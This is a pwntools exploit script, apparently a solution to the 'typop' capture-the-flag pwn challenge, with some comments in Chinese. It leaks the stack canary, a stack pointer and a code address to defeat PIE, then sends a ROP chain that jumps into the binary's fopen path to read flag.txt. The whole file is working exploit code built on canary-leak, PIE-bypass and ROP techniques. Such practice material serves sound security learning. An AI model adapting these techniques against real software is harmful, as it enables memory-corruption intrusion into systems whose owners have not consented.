from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'

p = process('../file/chall')
# p = remote('typop.chal.idek.team', '1337')
input('continue?')

p.recvline()
p.sendline(b'y')
p.recvline()
p.sendline(b'a' * 10) # 泄露canary地址
p.recvuntil(b'said: ')
data = p.recvuntil(b'\nAww :(', drop=True)
canary = b'\x00' + data[11:11+7]
print(canary)

stack_offset = 0x7ffc2ce21350 - 0x7ffc2ce2132e
rbp_address = u64(data[18:] + b'\0\0')
stack_address = rbp_address - stack_offset
print(stack_address)

p.recvuntil(b'feedback?\n')
p.sendline(b'a' * 10 + canary)

main55_offset_addr = 0x0000000000001447
p.recvline()
p.sendline(b'y')
p.recvline()
p.send(b'a' * 25 + b'\n') # 泄露main+55地址
p.recvuntil(b'said: ')
main55_true_addr = u64(p.recvuntil(b'Aww :(', drop=True)[26:26+6] + b'\x00\x00')
print(main55_true_addr)

base_address = main55_true_addr - main55_offset_addr # elf基地址
win_addr = 0x0000000000001249 + base_address
fopen_addr = 0x12ba + base_address
pop_rdi_ret = 0x00000000000014d3 + base_address
pop_rsi_pop_r15_ret = 0x00000000000014d1 + base_address
string_r = 0x2008 + base_address
string_flag = stack_address + 0x51

payload = b'flag.txt\0\0' + canary + flat(
	rbp_address - 0x100,
	pop_rdi_ret,
	string_flag,
	pop_rsi_pop_r15_ret,
	string_r,
	0,
	fopen_addr,
	b'a' * 7 + b'f',
	b'lag.txt\0'
)
p.recvuntil(b'feedback?\n')
p.sendline(payload)

p.interactive()